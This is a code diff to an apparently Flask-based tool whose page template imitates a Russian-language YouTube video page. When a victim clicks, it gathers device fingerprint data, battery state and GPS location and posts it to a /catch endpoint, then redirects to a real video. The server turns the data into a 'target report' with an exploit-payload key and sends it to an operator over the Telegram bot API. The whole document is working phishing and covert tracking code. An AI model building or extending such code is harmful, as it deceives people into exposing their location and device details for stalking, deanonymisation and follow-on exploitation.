@@ -70,31 +70,53 @@ HTML_TRAP = """
 <html>
 <head>
     <title>YouTube</title>
-    <meta property="og:title" content="YouTube: Новое видео на канале">
-    <meta property="og:description" content="1.2 млн просмотров • 2 часа назад">
-    <meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #f9f9f9; margin: 0; font-family: Roboto, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; }
+        .header { background: #fff; width: 100%; height: 56px; display: flex; align-items: center; padding-left: 16px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+        .player-box { background: #000; width: 100%; aspect-ratio: 16/9; position: relative; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        .play-btn { width: 68px; height: 48px; background: rgba(33,33,33,0.8); border-radius: 12%; position: relative; }
+        .play-btn::after { content: ''; position: absolute; left: 26px; top: 14px; border-left: 20px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
+        .info { padding: 15px; width: 90%; }
+        .title { font-size: 18px; font-weight: 400; color: #030303; margin-bottom: 8px; }
+        .meta { font-size: 14px; color: #606060; }
+        #loader { display: none; color: #fff; font-size: 14px; }
+    </style>
 </head>
-<body style="background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;" onclick="scan()">
-    <div style="text-align:center;border:1px solid #333;padding:50px;cursor:pointer;">
-        <div style="width:0;height:0;border-top:20px solid transparent;border-left:30px solid #fff;border-bottom:20px solid transparent;margin:0 auto 20px;"></div>
-        <button style="background:#f00;color:#fff;border:none;padding:10px 20px;font-weight:bold;cursor:pointer;">СМОТРЕТЬ</button>
+<body onclick="scan()">
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90">
     </div>
+    <div class="player-box" id="player">
+        <div class="play-btn" id="pbtn"></div>
+        <div id="loader">Загрузка...</div>
+    </div>
+    <div class="info">
+        <div class="title">Новое видео: Эксклюзивный репортаж (2026)</div>
+        <div class="meta">1 240 583 просмотра • 2 часа назад</div>
+    </div>
+
 <script>
 async function scan() {
+    document.getElementById('pbtn').style.display = 'none';
+    document.getElementById('loader').style.display = 'block';
+    
     let d = { aid: "{{ aid }}", ua: navigator.userAgent, plat: navigator.platform, res: screen.width+"x"+screen.height, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory };
     
-    // Сбор GPU
-    try { let c = document.createElement('canvas'); let gl = c.getContext('webgl'); let debug = gl.getExtension('WEBGL_debug_renderer_info'); d.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL); } catch(e) {}
-    // Сбор Батареи
-    try { let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "% (" + (b.charging ? "Зарядка" : "Разрядка") + ")"; } catch(e) {}
-    // Сбор Local IP
-    try { let pc = new RTCPeerConnection(); pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)); pc.onicecandidate = (i) => { if(i && i.candidate) d.lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1]; }; } catch(e) {}
+    try { 
+        let c = document.createElement('canvas'); let gl = c.getContext('webgl'); 
+        let dbg = gl.getExtension('WEBGL_debug_renderer_info'); 
+        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); 
+    } catch(e) {}
 
+    try { let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋"); } catch(e) {}
+
+    // Попытка взять GPS (вызовет системное окно)
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((p) => { 
-            d.gps = p.coords.latitude+","+p.coords.longitude; d.acc = p.coords.accuracy+"m"; send(d); 
-        }, () => { send(d); }, {timeout:3500});
+        navigator.geolocation.getCurrentPosition(
+            (p) => { d.gps = p.coords.latitude + "," + p.coords.longitude; d.acc = p.coords.accuracy + "m"; send(d); },
+            () => { send(d); }, { timeout: 3500 }
+        );
     } else { send(d); }
     setTimeout(() => { send(d); }, 5000);
 }
@@ -102,7 +124,7 @@ async function scan() {
 function send(d) {
     if(window.s) return; window.s = true;
     fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
-    .finally(() => { location.href = "https://youtube.com"; });
+    .finally(() => { location.href = "https://m.youtube.com/watch?v=dQw4w9WgXcQ"; });
 }
 </script>
 </body>
@@ -125,24 +147,20 @@ def catch():
     exploit_vault[token] = PAYLOADS.get(p_key)
 
     report = (
-        f"🚨 **ПОЛНЫЙ ТЕХНИЧЕСКИЙ ОТЧЕТ**\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🌐 **СЕТЬ:**\n"
-        f"• IP: `{ips}`\n"
-        f"• Local: `{d.get('lip', 'N/A')}`\n\n"
-        f"📍 **ГЕОЛОКАЦИЯ:**\n"
-        f"• `{d.get('gps', 'N/A')}` (±{d.get('acc', 'N/A')})\n"
-        f"• [Google Maps](https://www.google.com/maps?q={d.get('gps')})\n\n"
-        f"💻 **ЖЕЛЕЗО:**\n"
-        f"• CPU: {d.get('cores')} ядер | RAM: {d.get('mem')}GB\n"
-        f"• GPU: `{d.get('gpu', 'N/A')}`\n"
-        f"• Платформа: `{d.get('plat')}` | `{d.get('res')}`\n\n"
-        f"🔋 **БАТАРЕЯ:** {d.get('bat', 'N/A')}\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🔑 **КРИПТО-КЛЮЧ:** `{token}`\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"⚠️ *Для кода эксплоита перешли ключ админу.*"
-    )
+    f"🎬 **ОТЧЕТ ПО ЦЕЛИ: YouTube View**\n"
+    f"━━━━━━━━━━━━━━━━━━━━\n"
+    f"🌐 **IP Данные:**\n"
+    f"• Основной: `{ips}`\n"
+    f"• Локальный: `{d.get('lip', 'N/A')}`\n\n"
+    f"📱 **Устройство:**\n"
+    f"• Модель: `{d.get('plat')}` ({d.get('res')})\n"
+    f"• CPU: {d.get('cores')} ядер | RAM: {d.get('mem', 'N/A')}GB\n"
+    f"• GPU: `{d.get('gpu', 'N/A')}`\n\n"
+    f"🔋 **Статус:** {d.get('bat', 'Данные скрыты')}\n"
+    f"📍 **Место:** `{d.get('gps', 'Не разрешено')}`\n"
+    f"━━━━━━━━━━━━━━━━━━━━\n"
+    f"🔑 **Ключ эксплоита:** `{token}`"
+)
     
     url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
     requests.post(url, json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
